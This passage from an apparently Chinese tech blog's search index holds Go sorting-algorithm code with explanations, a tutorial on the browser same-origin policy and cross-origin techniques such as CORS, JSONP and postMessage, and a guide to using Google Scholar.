mergeSort(L[:middle]) right := mergeSort(L[middle:]) //合[并] return merge(left, right)}func merge(left, right []int) []int{ newArr := make([]int, len(left)+len(right)) i, j, index :=0,0,0 for { if left[i] &gt; right[j] { newArr[index] = right[j] index++ j++ if j == len(right) { copy(newArr[index:], left[i:]) break } }else{ newArr[index] = left[i] index++ i++ if i == len(left) { copy(newArr[index:], right[j:]) break } } } return newArr} 传入排序方法版本的归并排序, 由于Go语言不支持默认参数, 所以实现起来会有点不优雅, 暂且用参数 struct 来实现默认排序方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950type MergeConf struct { L []int Compare func(int, int) bool}func mergeSort2(conf MergeConf) []int { if len(conf.L) &lt;= 1 { return conf.L } if conf.Compare == nil { conf.Compare = func(a, b int) bool { return a &gt; b } } //递归 middle := len(conf.L) / 2 //不断地进行左右对半划分 leftConf := MergeConf{L: conf.L[:middle], Compare: conf.Compare} rightConf := MergeConf{L: conf.L[middle:], Compare: conf.Compare} //合并 return merge2(mergeSort2(leftConf), mergeSort2(rightConf), conf.Compare)}func merge2(left, right []int, compare func(int, int) bool) []int { newArr := make([]int, len(left)+len(right)) i, j, index := 0, 0, 0 for { if compare(left[i], right[j]) { newArr[index] = right[j] index++ j++ if j == len(right) { copy(newArr[index:], left[i:]) break } } else { newArr[index] = left[i] index++ i++ if i == len(left) { copy(newArr[index:], right[j:]) break } } } return newArr} 快速排序快速排序使用分治法（Divide and conquer）策略来把一个序列（list）分为较小和较大的2个子序列，然后递归地排序两个子序列。 步骤为： 挑选基准值：从数列中挑出一个元素，称为“基准”（pivot）， 分割：重新排序数列，所有比基准值小的元素摆放在基准前面，所有比基准值大的元素摆在基准后面（与基准值相等的数可以到任何一边）。在这个分割结束之后，对基准值的排序就已经完成， 递归排序子序列：递归地将小于基准值元素的子序列和大于基准值元素的子序列排序。递归到最底部的判断条件是数列的大小是零或一，此时该数列显然已经有序。 12345678910111213141516171819202122func quickSort(L []int) (result []int) { var n = len(L) if n &lt;= 1 { return L } var less, greater []int pivot := L[0] for i := 1; i &lt; n; i++ { if L[i] &lt; pivot { less = append(less, L[i]) } else if L[i] &gt;= pivot { greater = append(greater, L[i]) } } return append(append(quickSort(less), pivot), quickSort(greater)...)} 上面简单版本的缺点是，它需要 O(n) 的额外存储空间，也就跟归并排序一样不好。额外需要的存储器空间配置，在实际上的实现，也会极度影响速度和缓存的性能。有一个比较复杂使用原地（in-place）分割算法的版本，且在好的基准选择上，平均可以达到 O(log n) 空间的使用复杂度。 123456789101112func quickSort2(L []int, left, right int) { if left &gt;= right { return } pivotIndex := partition(L, left, right) quickSort2(L, left, pivotIndex-1) quickSort2(L, pivotIndex+1, right)} 1234567891011121314151617181920// 分段func partition(L []int, left, right int) (storeIndex int) { pivotIndex := getPivot(L, left, right) pivot := L[pivotIndex] swap(L, pivotIndex, right) // 把pivot移到結尾 storeIndex = left for i := left; i &lt; right; i++ { if L[i] &lt;= pivot { swap(L, storeIndex, i) storeIndex++ } } swap(L, right, storeIndex) // 把pivot移到它最後的地方 return} In the very early versions of quicksort, the leftmost element of the partition would often be chosen as the pivot element. Unfortunately, this causes worst-case behavior on already sorted arrays, which is a rather common use-case. 简易版快排使用最左边的元素, 这导致了在快排好的数组需要从头比较, 导致了worst-case behavior。 pivot基准的选择的演变也从选取中间数, 到 medians of three (三个坐标中最大的数) 甚至 ninther, 对于长度越大数组的排序性能提升愈加明显。 mid // 中数版本 median-of-3 method for Lomuto partition The ninther, which is the “median of three medians of three” is even better for very large n. 123456789101112131415func getPivot(L []int, low, high int) int { mid := low + (high-low)/2 // 用low + (high - low) / 2 而不直接用 (low + high) / 2是为了减少整数溢出的情况 if L[mid] &lt; L[low] { swap(L, mid, low) } if L[high] &lt; L[low] { swap(L, high, low) } if L[high] &lt; L[mid] { swap(L, mid, high) } return high} 插入排序定位上与选择排序非常相似, 是一种简单直观的排序算法。它的工作原理如下。首先在未排序序列第二位起固定一个指针，和已排序序列最后一位开始比较，一直和前一位交换位置直到若比当前元素小则停止，以此类推，直到所有元素均排序完毕。 稳定, 适合场景：对快要排序完成的数组时间复杂度为 O(n), 非常低的开销 123456789101112func insertionSort(L []int) { var n = len(L) for i := 1; i &lt; n; i++ { j := i for j &gt; 0 { if L[j-1] &gt; L[j] { swap(L, j-1, j) } j = j - 1 } }} 插入排序的比较是向已排序的数组找一个合适的位置， 用二分法直接找到插入点可以将这一步骤的复杂度变为O(lgN) 123456789101112// version2func insertionSort2(L []int) { var n = len(L) for i := 1; i &lt; n; i++ { j := i insertIndex := searchInsert(L[:j], L[i]) for j &gt; insertIndex { swap(L, j-1, j) j = j - 1 } }} 希尔排序希尔排序，也称递减增量排序算法，是插入排序的一种更高效的改进版本。希尔排序是非稳定排序算法。 希尔排序是基于插入排序的以下两点性质而提出改进方法的： 插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率 但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位。 其中 gap（增量）的选择是希尔排序的重要部分。只要最终 gap 为 1 任何 gap 序列都可以工作。算法最开始以一定的 gap 进行排序。然后会继续以一定 gap 进行排序，直到 gap = 1 时，算法变为插入排序。初版 gap 选择为 n/2 。 1234567891011121314151617func shellSort(L []int) { n := len(L) if n &lt; 2 { return } gap := n / 2 for gap &gt; 0 { for i := gap; i &lt; n; i++ { j := i for j &gt;= gap &amp;&amp; L[j] &lt; L[j-gap] { L[j], L[j-gap] = L[j-gap], L[j] j = j - gap } } gap = gap / 2 }} 已知的最好步长序列是由Sedgewick提出的(1, 5, 19, 41, 109,…), 第二版是用已知的公理 最佳部长序列来替换n/2 。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546func shellSort2(L []int) []int { n := len(L) if n &lt; 2 { return L } gap, step := findGap(n / 2) for gap &gt; 0 { for i := gap; i &lt; n; i++ { j := i for j &gt;= gap &amp;&amp; L[j] &lt; L[j-gap] { swap(L, j, j-gap) j = j - gap } } step-- gap = createGap(step) } return L}// 已数组长度查询最接近的增量序列 indexfunc findGap(num int) (gap, step int) { gap = 1 for gap &lt; num { step++ gap = createGap(step) } return}// 根据增量序列 index 返回 gapfunc createGap(n int) (gap int) { if n &lt; 0 { return 0 } if n == 1 { return 1 } return int(math.Pow(2, float64(n+2))*(math.Pow(2, float64(n+2))-3) + 1)} 堆排序堆排序可以认为是选择排序的改进版，像选择排序一样将输入划分为已排序和待排序。 不一样的是堆排序利用堆这种近似完全二叉树的良好的数据结构来实现排序，本质上使用了二分的思想。 它在拥有良好的可预测性的同时（不管输入什么都是 O(n·log(n)) 时间复杂度），但它的缺点也有：即不稳定，而且 O(n·log(n)) 的平均效率决定了它的效率不如快速排序。适用于数据库内引擎排序（需要这样的可预测性性能）。 123456789101112131415function heapSort(arr) { const size = arr.length; // 初始化 heap，i 从最后一个父节点开始调整，直到节点均调整完毕 for (let i = Math.floor(size / 2) - 1; i &gt;= 0; i--) { heapify(i, size); } // 堆排序：先将第一个元素和已拍好元素前一位作交换，再重新调整，直到排序完毕 for (let i = size - 1; i &gt; 0; i--) { swap(arr, 0, i); heapify(0, i); } return arr;} 1234567891011121314151617181920212223func heapify(L []int, start, end int) { // 建立父节点下标和子节点下标 dad := start son := dad*2 + 1 // 超过数组长度 不存在子节点 if son &gt;= end { return } // 优先查看右节点 if son+1 &lt; end &amp;&amp; L[son] &lt; L[son+1] { son++ } // 交换位置后 对交换的子节点进行相同 heapify 操作 if L[dad] &lt;= L[son] { swap(L, dad, son) heapify(L, son, end) } return} 排序算法比较 worst-case best case Average Worst-case space complexity 特点 冒泡排序 O(n^2) 比较О(n^2) 交换 O(n^2) 比较О(1) 交换 O(n^2) 比较О(n^2) 交换 O(1) 辅助空间(证明是in-place sort) 排列一个几乎快排好的数组时间复杂度为O(n) 选择排序 O(n^2) 比较О(n) 交换 O(n^2) 比较О(1) 交换 O(n^2) 比较О(n) 交换 O(1) 辅助空间(证明是in-place sort) 由于交换复杂度为稳定的O(n), 在特定应用上交换操作消耗比较大时可以选择 插入排序 O(n^2) 比较О(n^2) 交换 O(n^2) 比较О(n^2) 交换 O(n^2) 比较О(n) 交换 O(1) 辅助空间О(n) total 用二分查找可以优化比较复杂度至 (log n) 合并排序 O(nlog n) O(nlog n)O(n)自然合并排序 O(nlog n) O(n) 辅助空间O(1) 链表 分治思想 快速排序 O(n^2) O(nlog n)(simple partition) O(n) (three-way partition and equal keys) O(nlog n) O(n) auxiliary (naive) O(log n) auxiliary (Hoare 1962) 希尔排序 根据步长序列的不同而不同。已知最好为 O(n log2 n) O(n) 根据步长序列的不同而不同。 O(n) 辅助空间 total O(1) 堆排序 O(nlog n) O(nlog n) (distinct keys)or O(n) (equal keys) O(n·logn) O(n) 辅助空间 total O(1) 总结数据几乎快排序完成时？ 插入排序不解释 数据量小，对效率要求不高，代码简单时？ 性能大小：希尔排序 &gt; 插入排序 &gt; 冒泡排序 &gt; 选择排序 数据量大，要求稳定的效率（不会像快速排序一样有 O(n²) 的情况）（如数据库中）？ 堆排序 数据量大，要求效率高，而且要稳定？ 归并排序 数据量大，要求最好的平均效率？ 性能大小：快速排序 &gt; 堆排序 &gt; 归并排序 因为虽然堆排序做到了 O(n·logn)，而快速排序的最差情况是 O(n²)，但是快速排序的绝大部分时间的效率比 O(n·log(n) 还要快，所以快速排序真的无愧于它的名字。（十分快速） 选择排序绝对没用吗？ 选择排序只需要 O(n) 次交换，这一点它完爆冒泡排序(冒泡是真没用)。 其他辅助方法1234567891011121314151617181920// 交换元素位置func swap(a []int, i, j int) { a[i], a[j] = a[j], a[i]}// 二分法查找插入位置func searchInsert(nums []int, target int) int { l, r := 0, len(nums)-1 for l &lt;= r { mid := l + (r-l)/2 if nums[mid] &lt; target { l = mid + 1 } else if nums[mid] &gt; target { r = mid - 1 } else { return mid } } return l} 参考 Wikipedia 排序相关 归并排序go实现 https://emacsist.github.io/2016/11/22/golang-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8Fmergesort/ https://www.rayjune.me/2018/03/22/elegant-javascript-sorting-algorithm-es6/","link":"/posts/2812144.html"},{"title":"浏览器同源策略","text":"同源策略是Web应用程序安全模型的一个重要概念。指在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的URI、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。 1Origin = protocol + host + port(如果有指定的话)(协议/主机/端口元组) URL及其组成部分1234567891011 hierarchical part ┌───────────────────┴─────────────────────┐ authority path ┌───────────────┴───────────────┐┌───┴────┐ abc://username:password@example.com:123/path/data?key=value&amp;key2=value2#fragid1 └┬┘ └───────┬───────┘ └────┬────┘ └┬┘ └─────────┬─────────┘ └──┬──┘scheme user information host port query fragment urn:example:mammal:monotreme:echidna └┬┘ └──────────────┬───────────────┘scheme path 同源网站举例下表列出哪些URL与URL http://www.example.com/dir/page.html 属于相同来源： 比较URL 结果 原因 http://www.example.com/dir/page2.html 是 相同 协议/主机/端口 http://www.example.com/dir2/other.html 是 相同 协议/主机/端口 http://username:password@www.example.com/dir2/other.html 是 相同 协议/主机/端口 http://www.example.com:81/dir/other.html 否 相同 协议/主机, 不同端口 https://www.example.com/dir/other.html 否 不同 协议 http://en.example.com/dir/other.html 否 不同 主机 http://example.com/dir/other.html 否 不同 主机(未完全匹配) http://v2.www.example.com/dir/other.html 否 不同 主机(未完全匹配) http://www.example.com:80/dir/other.html 看情况 显式端口, 根据浏览器实现有所不同 记录一个遇到的坑: 网络上存在一些老旧的错误示例, 例如仅依靠相同协议/主机来判断URL是否同源, 刚好笔者公司项目是以相同主机不同端口的形式部署导致cookie混用, 折腾了些时间 同源策略规避方法实际中，有时候我们需要突破这样的限制，因此下面将介绍几种跨域的解决方法。 CORSCORS（Cross-origin resource sharing，跨域资源共享）是一个 W3C 标准，定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。 CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。 整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。 浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。 只要同时满足以下两大条件，就属于简单请求。反之就属于非简单请求。 请求方法是以下三种方法之一： HEAD GET POST HTTP的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain DPR Downlink Save-Data Viewport-Width Width 简单请求 在请求中需要附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定是否给予响应。例如：Origin: http://www.chkaos.top 如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）。例如：Access-Control-Allow-Origin：http://www.chkaos.top 没有这个头部或者有这个头部但源信息不匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。注意，请求和响应都不包含 cookie 信息。 如果需要包含 cookie 信息，ajax 请求需要设置 xhr 的属性 withCredentials 为 true，服务器需要设置响应头部 Access-Control-Allow-Credentials: true。 非简单请求浏览器在发送真正的请求之前，会先发送一个 Preflight 请求给服务器，这种请求使用 OPTIONS 方法，发送下列头部： Origin：与简单的请求相同。 Access-Control-Request-Method: 请求自身使用的方法。 Access-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。 例如: 123Origin: http://www.chkaos.topAccess-Control-Request-Method: POSTAccess-Control-Request-Headers: NCZ 发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通： Access-Control-Allow-Origin：与简单的请求相同。 Access-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。 Access-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。 Access-Control-Max-Age: 应该将这个 Preflight 请求缓存多长时间（以秒表示）。 例如: 1234Access-Control-Allow-Origin: http://www.chkaos.topAccess-Control-Allow-Methods: GET, POSTAccess-Control-Allow-Headers: NCZAccess-Control-Max-Age: 1728000 一旦服务器通过 Preflight 请求允许该请求之后，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样了。 优点 CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。 支持所有类型的 HTTP 请求。 缺点 存在兼容性问题，特别是 IE10 以下的浏览器。 第一次发送非简单请求时会多一次请求。 JSONP 跨域由于 script 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script 标签，然后利用 src 属性进行跨域，这也就是 JSONP 跨域的基本原理。 下面的例子来说明 JSONP 实现跨域的流程: 1234567891011121314// 1. 定义一个 回调函数 handleResponse 用来接收返回的数据function handleResponse(data) { console.log(data);};// 2. 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponsevar body = document.getElementsByTagName('body')[0];var script = document.gerElement('script');script.src = 'http://www.chkaos.top/json?callback=handleResponse';body.appendChild(script);// 3. 通过 script.src 请求 `http://www.chkaos.top/json?callback=handleResponse`，// 4. 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse({&quot;name&quot;: &quot;chkaos&quot;}) 给浏览器// 5. 浏览器在接收到 handleResponse({&quot;name&quot;: &quot;chkaos&quot;}) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。 优点 使用简便，没有兼容性问题，目前最流行的一种跨域方法。 缺点 只支持 GET 请求。 由于是从其它域中加载代码执行，因此如果其他域不安全，很可能会在响应中夹带一些恶意代码。 要确定 JSONP 请求是否失败并不容易。虽然 HTML5 给 script 标签新增了一个 onerror 事件处理程序，但是存在兼容性问题。 图像 Ping 跨域由于img标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过 img 标签的 src 属性进行跨域，这也就是图像 Ping 跨域的基本原理。 直接通过下面的例子来说明图像 Ping 实现跨域的流程： 123456789var img = new Image();// 通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本img.onload = img.onerror = function() { console.log(\"Done!\");}// 请求数据通过查询字符串形式发送img.src = 'http://www.chkaos.top/test?name=chkaos'; 优点 用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势 缺点 只支持 GET 请求 只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本 WebSocketWebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。 下面是一个例子，浏览器发出的WebSocket请求的头信息: 12345678GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==Sec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13Origin: http://example.com 上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。 正是因为有了Origin这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。 12345HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat 服务器代理浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所有域的资源再返回给客户端。服务器代理是万能的。 iframedocument.domain 跨域对于主域名相同，而子域名不同的情况，可以使用 document.domain 来跨域。这种方式非常适用于 iframe 跨域的情况。 比如，有一个页面，它的地址是 http://www.chkaos.top/a.html，在这个页面里面有一个 iframe，它的 src 是 http://chkaos.top/b.html。很显然，这个页面与它里面的 iframe 框架是不同域的，所以我们是无法通过在页面中书写 js 代码来获取 iframe 中的东西的。 这个时候，document.domain 就可以派上用场了，我们只要把 http://www.chkaos.top/a.html 和 http://chkaos.top/b.html 这两个页面的 document.domain 都设成相同的域名就可以了。但要注意的是，document.domain 的设置是有限制的，我们只能把 document.domain 设置成自身或更高一级的父域，且主域必须相同。例如：a.b.chkaos.top 中某个文档的 document.domain 可以设成 a.b.chkaos.top、b.chkaos.top 、chkaos.top 中的任意一个，但是不可以设成 c.a.b.chkaos.top ，因为这是当前域的子域，也不可以设成 baidu.com，因为主域已经不相同了。 例如，在页面 http://www.chkaos.top/a.html 中设置document.domain： 1234567&lt;iframe src=\"http://chkaos.top/b.html\" id=\"myIframe\" onload=\"test()\"&gt;&lt;script&gt; document.domain = 'chkaos.top'; // 设置成主域 function test() { console.log(document.getElementById('myIframe').contentWindow); }&lt;/script&gt; 在页面 http://chkaos.top/b.html 中也设置 document.domain，而且这也是必须的，虽然这个文档的 domain 就是 chkaos.top，但是还是必须显式地设置 document.domain 的值 123&lt;script&gt; document.domain = 'chkaos.top'; // document.domain 设置成与主页面相同&lt;/script&gt; 这样，http://www.chkaos.top/a.html 就可以通过 js 访问到 http://chkaos.top/b.html 中的各种属性和对象了。 window.name 跨域window 对象有个 name 属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面（不管是相同域的页面还是不同域的页面）都是共享一个 window.name 的，每个页面对 window.name 都有读写的权限，window.name 是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。 通过下面的例子介绍如何通过 window.name 来跨域获取数据的。 页面 http://www.chkaos.top/a.html 的代码： 123456789101112131415161718&lt;iframe src=\"http://chkaos.top/b.html\" id=\"myIframe\" onload=\"test()\" style=\"display: none;\"&gt;&lt;script&gt; // 2. iframe载入 \"http://chkaos.top/b.html 页面后会执行该函数 function test() { var iframe = document.getElementById('myIframe'); // 重置 iframe 的 onload 事件程序， // 此时经过后面代码重置 src 之后， // http://www.chkaos.top/a.html 页面与该 iframe 在同一个源了，可以相互访问了 iframe.onload = function() { var data = iframe.contentWindow.name; // 4. 获取 iframe 里的 window.name console.log(data); // hello world! }; // 3. 重置一个与 http://www.chkaos.top/a.html 页面同源的页面 iframe.src = 'http://www.chkaos.top/c.html'; }&lt;/script&gt; 页面 http://chkaos.top/b.html 的代码： 1234&lt;script type=\"text/javascript\"&gt; // 1. 给当前的 window.name 设置一个 http://www.chkaos.top/a.html 页面想要得到的数据值 window.name = \"hello world!\";&lt;/script&gt; location.hash 跨域 (片段标识符（fragment identifier）)location.hash 方式跨域，是子框架修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。 页面 http://www.chkaos.top/a.html 的代码： 123456789&lt;iframe src=\"http://chkaos.top/b.html\" id=\"myIframe\" onload=\"test()\" style=\"display: none;\"&gt;&lt;script&gt; // 2. iframe载入 \"http://chkaos.top/b.html 页面后会执行该函数 function test() { // 3. 获取通过 http://chkaos.top/b.html 页面设置 hash 值 var data = window.location.hash; console.log(data); }&lt;/script&gt; 页面 http://chkaos.top/b.html 的代码： 1234&lt;script type=\"text/javascript\"&gt; // 1. 设置父页面的 hash 值 parent.location.hash = \"world\";&lt;/script&gt; postMessage 跨域(Cross-document messaging)window.postMessage(message，targetOrigin) 方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。这个应该就是以后解决 dom 跨域通用方法了。 调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。 需要接收消息的 window 对象，可是通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。 页面 http://www.chkaos.top/a.html 的代码： 1234567891011&lt;iframe src=\"http://chkaos.top/b.html\" id=\"myIframe\" onload=\"test()\" style=\"display: none;\"&gt;&lt;script&gt; // 1. iframe载入 \"http://chkaos.top/b.html 页面后会执行该函数 function test() { // 2. 获取 http://chkaos.top/b.html 页面的 window 对象， // 然后通过 postMessage 向 http://chkaos.top/b.html 页面发送消息 var iframe = document.getElementById('myIframe'); var win = iframe.contentWindow; win.postMessage('我是来自 http://www.chkaos.top/a.html 页面的消息', '*'); }&lt;/script&gt; 页面 http://chkaos.top/b.html 的代码： 1234567&lt;script type=\"text/javascript\"&gt; // 注册 message 事件用来接收消息 window.onmessage = function(e) { e = e || event; // 获取事件对象 console.log(e.data); // 通过 data 属性得到发送来的消息 }&lt;/script&gt; LocalStorage通过window.postMessage，读写其他窗口的 LocalStorage 也成为了可能。 下面是一个例子，主窗口写入iframe子窗口的localStorage。 1234567891011121314151617window.onmessage = function(e) { if (e.origin !== 'http://bbb.com') return; var payload = JSON.parse(e.data); switch (payload.method) { case 'set': localStorage.setItem(payload.key, JSON.stringify(payload.data)); break; case 'get': var parent = window.parent; var data = localStorage.getItem(payload.key); parent.postMessage(data, 'http://aaa.com'); break; case 'remove': localStorage.removeItem(payload.key); break; }}; 上面代码中，子窗口将父窗口发来的消息，写入自己的LocalStorage。 父窗口发送消息的代码如下。 1234567891011var win = document.getElementsByTagName('iframe')[0].contentWindow;var obj = { name: 'Jack' };// 存入对象win.postMessage(JSON.stringify({key: 'storage', method: 'set', data: obj}), 'http://bbb.com');// 读取对象win.postMessage(JSON.stringify({key: 'storage', method: \"get\"}), \"*\");window.onmessage = function(e) { if (e.origin != 'http://aaa.com') return; // \"Jack\" console.log(JSON.parse(e.data).name);}; 参考链接 https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html https://juejin.cn/post/6844903681683357710#heading-4","link":"/posts/7440f480.html"},{"title":"谷歌学术使用指南","text":"谷歌学术相当于学术版的谷歌搜索引擎，覆盖约 2 亿篇文章的数据库，支持丰富的文献格式，同时还可提供全文链接，引用数和相关文章。在功能上其他学术搜索引擎无可比拟。 但它让人又爱又恨，一方面它搜索全面快速，但同时太多的检索结果，反而让人无所适从。好在还是有些技巧可以帮助你更高效地使用 Google Scholar。 初识谷歌学术搜索界面首先带领大家好好认识下 Google Scholar 检索页面。以搜索 machine learning 为例： 第一行：文献标题。 第二行显示文献的相关信息：作者，登载的期刊书籍，出版年份以及出版商。 大段文字为文章的部分摘要。 单击文章标题即可跳转到相关详情页面。可以查看更多文章摘要或是 pdf 下载及预览。 有时候可以看到搜索结果右边还有一个链接，这个链接是 Google scholar 检索到的全文链接（PDF 或 HTML），点击可查看全文。 链接的内容不保证是最新版本以及内容全面。 最下面一栏，包括收藏，引用，引用数（Cited by），相关文章（Related articles），以及全部版本（All * versions）还有一个被折叠的（View as HTML）。 引用图标 点击会出现一个弹窗，其中包含常用的引用格式：例如 MLA，APA，Chicago，Harvard 和 Vancouver。可以复制和粘贴。还包括用于将引用数据导出为任何主要参考管理器都可以导入的BibTeX或RIS）文件的链接。 Google 学术搜索的reference格式有时不完整，因此通常最好根据文章来源再检查下。 引用数（Cited by） 文章引用数越多自然证明这篇文章权重越高。而且还有一个优点，就是可以查看引用这篇文献的相关文献，意味着你可以顺藤摸瓜查看到很多最新相关研究。 点击某一检索的 Cited by，就又出现了一个类似的搜索界面，所呈现的文章均是引用文献的相关文章。 注意：不要把引用数当做衡量文章权重的唯一标准。因为文章出版存在滞后性。大多数文章至少需要六个月的时间才能发表，这就意味着有些文章哪怕是引用了此文献，也要等六个月才知道。所以，对于时间比较新的一些文献，引用率是比不上发表时间更早的文献。 相关文章 Related articles 是关于此文献的其他同类链接，如果点击文章标题没有找到文献，可以在这里试试，看其他同类链接能不能访问文章。 View as HTML 使用网页的方式查看。打个比方，对于有些链接打开是pdf文档的检索链接： 点击 View as HTML 后，就转化成无格式网页版： 转化后的页面，可能存在一定的乱码和文章错版. 这个时候，一方面可以很方便对文章进行复制选择，另一方面，还有选择 Chrome 浏览器的一大功能——网页翻译： 点击鼠标右键出现菜单栏进行选择，就可以看到翻译后的全文了： Google 翻译就别指望有多准确，但筛选文献基本够用. 其他 基本只有跳转链接直接为 pdf 或者全文的才有 View as HTML 的选项。比如下图的例子就没有： 有些转化效果不一定很好，甚至可能出现乱码，但是对于快速筛选文献来说还是很方便。 侧边栏：主要方便对文章进行大致筛选，包括时间，排序，包含内容。 搜索技巧下面我们要说的就是重点了。一些基础的检索规则： Google Scholar 搜索不区分大小写。打个比方搜索 Machine Learning 和 machine learning 是没有区别的。 使用关键词而不是长句进行搜索。 不要用长句比如 what is the current state of the technology used for self driving cars，而是明确关键词类似 self-driving cars， autonomous vehicles， 或 driverless cars。 “”引号内的检索词会被看做一个整体。分组的单词和确切的短语应该用引号引起来。 如果有引号括起一些词组，则可以在文档的标题和正文中搜索该词组的完全匹配项。如果没有引号，Google 学术搜索可能单独搜索每个单词。注意中英文格式哦。 可在搜索短语中添加年份，搜索指定年限文章。比如搜索 self-driving cars 2015，就可以检索到2015年的相关文献。 搜索通用的布尔运算符也可方便进行筛选： 记住 虽然检索不区分大小写，但是单词作为布尔运算符出现时，必须要大写： AND：同，前后两个单词或者词组都要出现。 NOT：否，排除包含排在其后的单词词组的检索结果。 OR：或，前后的单词词组有同样的权重，检索结果可仅匹配其一。 如果需要进一步对搜索结果进行筛选，无论是前面提到的侧边栏，还是 Advanced search 均可进一步缩小范围： 自定义搜索选项调整 Google Scholar 搜索结果，很多时候没那个必要，这里只介绍两个比较有用的功能： Library links： 主要是方便你添加学校图书馆地址，使搜索结果优先呈现学校图书馆内的链接。 很多文章都是要收费下载的，但是学校图书馆如果有购买的话就可直接阅读，Google 学术搜索可让您通过学校的订阅获得文章的全文（如果有的话）。 点击搜索页面侧边栏出现的“设置”图标进行添加 Google Scholar Button： 这是 Chrome 浏览器的一个插件，可在工具栏中添加下拉搜索框-允许您从任何网站进行 Google 学术搜索。在网页上选择单词时也可直接进行搜索。 局限性虽然 Google 学术搜索很强大，但还是有其局限的地方。 Google 学术搜索不会显示可以在本地图书馆目录中搜索到的所有资源。例如，图书馆数据库可以检索到播客，视频，文章，统计数据或特殊藏书，而目前 Google 学术搜索只有以下几种出版物类型： 期刊文章：在期刊上发表的文章。它是来自peer reviewed journals, predatory journals 以及 pre-print archives。 图书：尽可能链接到 Google 的受限文本。 书籍章节：书籍中的章节，部分图书的电子版本。 书评 会议录：作为会议一部分所撰写的论文，通常用作会议演讲的一部分。 法院意见 专利：只有在侧边栏中选择了选项，Google学术搜索才会搜索专利。 并且由于不是人工筛选，有些内容的质量和学术性是存疑的，大家也要多加分辨。 建议同学们配合学校图书馆检索，以及其他搜索引擎，将文献一网打尽~ 原文链接： https://zhuanlan.zhihu.com/p/107911957","link":"/posts/b1ca8d55.html"}],"tags":[{"name":"建站小记","slug":"建站小记","link":"/tags/%E5%BB%BA%E7%AB%99%E5%B0%8F%E8%AE%B0/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"React","slug":"React","link":"/tags/React/"},{"name":"React Diff","slug":"React-Diff","link":"/tags/React-Diff/"},{"name":"Theia","slug":"Theia","link":"/tags/Theia/"},{"name":"VS Code","slug":"VS-Code","link":"/tags/VS-Code/"},{"name":"How JavaScript works","slug":"How-JavaScript-works","link":"/tags/How-JavaScript-works/"},{"name":"Google Chrome 